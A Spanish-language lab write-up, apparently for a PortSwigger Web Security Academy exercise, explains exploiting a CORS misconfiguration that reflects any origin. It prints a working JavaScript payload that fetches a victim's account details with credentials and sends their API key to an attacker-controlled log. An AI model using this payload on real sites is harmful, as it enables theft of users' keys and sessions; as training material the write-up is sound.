CORS vulnerability with basic origin reflection

Autor: h4ckgiver

Descripción del Laboratorio

Este sitio web tiene una configuración de CORS insegura, confía en todos los orígenes.

Resolución

Nos logeamos con las credenciales wiener:peter con burpsuite en escucha.

En el HTTP history vemos una petición /accountDetails la cual contiene la apikey de nuestra sesión. Observamos que la cabecera Access-Control-Allow-Credentials está seteada en true.

Agregamos la cabecera Origin a la petición y vemos que su contenido se refleja en la cabecera.

Una vez comprobada la vulnerabilidad, nos vamos al exploit server, copiamos el siguiente código y lo enviamos a la victima.


¡Copiado!

<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>

Vemos que en los logs que recibimos el apitoken de la victima.

Enviamos el apikey de la victima y resolvemos el laboratorio!
